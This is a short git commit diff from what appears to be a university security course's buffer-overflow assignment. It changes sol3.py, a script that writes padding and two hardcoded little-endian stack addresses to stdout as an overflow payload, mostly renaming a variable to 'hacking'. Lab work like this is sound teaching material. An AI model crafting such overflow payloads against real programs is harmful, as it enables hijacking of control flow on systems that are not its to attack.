ced168090d2e1770be2f1494d230d288fd797164
eecs388 <adwisi@umich.edu>
2024-11-14 21:33:25 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol3.py
+++ sol3.py
@@ -12,6 +12,5 @@ sys.stdout.buffer.write(padding)
 
 a = 0x00007ffffff687c0.to_bytes(8, 'little')
 ptr_addr = 0x00007ffffff68fd8.to_bytes(8, 'little')
-output = a + ptr_addr
-sys.stdout.buffer.write(output)
-#sys.stdout.buffer.write(ptr_addr)
+hacking = a + ptr_addr
+sys.stdout.buffer.write(hacking)
